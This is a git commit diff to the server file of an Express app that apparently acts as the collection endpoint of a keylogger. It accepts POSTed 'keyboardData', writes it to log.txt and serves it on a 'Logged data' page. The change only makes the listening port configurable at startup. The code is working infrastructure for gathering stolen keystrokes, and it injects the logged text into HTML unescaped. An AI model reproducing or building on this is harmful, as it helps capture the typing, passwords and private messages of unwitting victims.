4ba6c24a0a1dde57fc4179b44956cd5d4b7f33cf
Josakko <112590914+Josakko@users.noreply.github.com>
2023-03-28 17:36:27 +0100

    Update index.js

--- server/index.js
+++ server/index.js
@@ -1,27 +1,35 @@
 const fs = require("fs");
 const express = require("express");
 const bodyParser = require("body-parser");
+const readline = require("readline");
 
 const app = express();
 app.use(bodyParser.json({extended: true}));
 
-const port = 8080;
-
-app.get("/", (req, res) => {
-    try {
-        const kl_file = fs.readFileSync(`./log.txt`, {encoding:'utf8', flag:'r'});    
-        res.send(`<h1>Logged data</h1><p>${kl_file.replace("\n", "<br>")}</p>`);
-    } catch {
-        res.send("<h1>Nothing logged yet.</h1>");
-    }  
+const rl = readline.createInterface({
+    input: process.stdin,
+    output: process.stdout
 });
 
-app.post("/", (req, res) => {
-    console.log("Request received!");
-    fs.writeFileSync(`log.txt`, req.body.keyboardData);
-    res.send("Successfully set the data");
-});
+rl.question("Enter the port number to use: ", function(port) {
+    app.get("/", (req, res) => {
+        try {
+            const kl_file = fs.readFileSync(`./log.txt`, {encoding:'utf8', flag:'r'});    
+            res.send(`<h1>Logged data</h1><p>${kl_file.replace("\n", "<br>")}</p>`);
+        } catch {
+            res.send("<h1>Nothing logged yet.</h1>");
+        }  
+    });
 
-app.listen(port, () => {
-    console.log(`Listening on port ${port}`);
+    app.post("/", (req, res) => {
+        console.log("Request received!");
+        fs.writeFileSync(`log.txt`, req.body.keyboardData);
+        res.send("Successfully set the data");
+    });
+
+    app.listen(port, () => {
+        console.log(`Listening on port ${port}`);
+    });
+
+    rl.close();
 });
